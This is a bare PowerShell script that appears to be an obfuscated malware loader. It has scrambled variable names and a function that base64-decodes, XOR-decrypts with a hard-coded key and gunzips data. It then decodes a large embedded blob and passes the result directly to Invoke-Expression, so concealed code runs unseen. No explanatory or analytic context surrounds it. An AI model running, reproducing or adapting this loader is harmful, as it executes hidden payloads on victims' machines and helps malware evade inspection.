$tdh02rk9eyo6mpz = [System.Text.Encoding]::ascii
function gt20i71d9e5n6oqcvb8kprlhuxa  {param($x7lhnyce5fvr0u8 )
  $hnmzi2u9e7d6otg = [System.Convert]::FromBase64String($x7lhnyce5fvr0u8)
  $raj92y7i8fmudhw= $tdh02rk9eyo6mpz.GetBytes("k6fx10ieodnm")
    $mwf0upqhrtob3zi = $hnmzi2u9e7d6otg
    $4rhx6lmd7za1vyg = $(for ($qcnj2v0uoi6zlaw = 0; $qcnj2v0uoi6zlaw -lt $mwf0upqhrtob3zi.length; ) {
        for ($um34k9eqysizl7o = 0; $um34k9eqysizl7o -lt $raj92y7i8fmudhw.length; $um34k9eqysizl7o++) {
            $mwf0upqhrtob3zi[$qcnj2v0uoi6zlaw] -bxor $raj92y7i8fmudhw[$um34k9eqysizl7o]
            $qcnj2v0uoi6zlaw++
            if ($qcnj2v0uoi6zlaw -ge $mwf0upqhrtob3zi.Length) {
                $um34k9eqysizl7o = $raj92y7i8fmudhw.length
            }
        }
    })
	$vjasf6mowldiqbx = New-Object System.IO.MemoryStream( , $4rhx6lmd7za1vyg )

	    $ginouv9drmpf1tk = New-Object System.IO.MemoryStream
        $r421xqk6dmswnel = New-Object System.IO.Compression.GzipStream $vjasf6mowldiqbx, ([IO.Compression.CompressionMode]::Decompress)
	    $r421xqk6dmswnel.CopyTo( $ginouv9drmpf1tk )
        $r421xqk6dmswnel.Close()
		$vjasf6mowldiqbx.Close()
		[byte[]] $xrq06l45n89idot = $ginouv9drmpf1tk.ToArray()
 $2znrcswjfmuo4ia=$xrq06l45n89idot
    return $2znrcswjfmuo4ia
}
[byte[]]$uazb5yt3k1h0ir7=gt20i71d9e5n6oqcvb8kprlhuxa $c6mlbpshvug5zoj
[System.Text.Encoding]::ascii.GetString((gt20i71d9e5n6oqcvb8kprlhuxa "dL1ueDEwaWVrZOM4sFi9QCFNx2WSZy/V42ox+k1Z2yz/Y7U4edmgER/2394BNL5/RgfwMLSSFa6VuxkZGtSuBbk0IYcfHIih8hfDEwvsuvHU7mfjebkrXx3FO+HxEWOsfiUvWpImmQ2iPodcVsRo/cMPyj8rMU7REdczM7mvb1suAwYR1Hxy9Z0hNE+khcCdc8F5Nn94i1cJOT64MB/8YAlUt7FgQvKPEXBHO1BjDfHXrMoiY4WCd14lpRTSQP3qwWYfN/lLTKQNCJOX6fnPLNFBRyC7R2dQh6JILcVK8IUJr997RpAQYg41O+wmH6Oz9Md4DDj4DY9owG0tXlVMXHnAjZeosrIjbg06/1UxWpNGvt33yuwFG7Skkk9XIRvZSG/n4nfdp4n3WsN/3TjpPLhq3IPHAVsyu5w49fcrlbqGVsCfFnaAHDh034WMToYubobUxuBIUvpYr/BLVeuxnBv/C+oeegoy/3yUF+ZcN+KKg0iCtSGVNgTvsvC0QQtShwhDLZjURsXV0r+yheFnNyU5KjgUSkgbhDQgr1uiGQoVAk6eOgbodPJu3wik5okcdgP2+d1Vzvzi2xraiPUaBDXTlnV/UYFtKnKulLqkQrEDRd4SL/kFTxHCyJMENynUYYMPNGWwpxXilpdk4lXpUMOD4eoaSfQUZ9z5Q0z4lLj/NcBV4t6/uRMg4F8HeDYZIjkSNeN4pcymJC/5qLv6mfz/JjPzUJ3ISmV2X/bqLw0PD6MP93tJXB0EWiFHVTci1ZoyA+c8BUPgrhjdLZSyZ5nvKusfTEZN6Pr9VDasbKWnmPXpQuulONeG9020v/e70tTIL5c3tqGcqL9Hzf5CMXOTIN0t3ILlqgFe+pNou0HuRjSKR5IvRrJ/HAgz/ZP6rmUW+PdB/y99M+OpPBDP07VscGCiq8Y5aeFneNx6Pl2LoiKLuW6Opl9VMwafHcNuRQzgHvbagqpvm7dym1e1zraHp7LkOomR1w3W1yferMCQq+GTxtW4RP+2NLrRFoADhvc7itLiNpmKWFS6Jfl4DiZejt9Y3K7CjI/IvVNxDHe/VCrxRfpnqIuhS+M8HdvAa/B/d0kRmn/3RYJBCBDn0HofyNVAoa+03tvi5X2CIrJpGEALv8p4yVDJCqyrKXv4Up5jmyE67dtcugCQaThIkG92hS4lcHrdQMtSeukbb5ib3z6o7f1RXxpGjQwOnnHRA+8hJzYwaQ=="))|iex;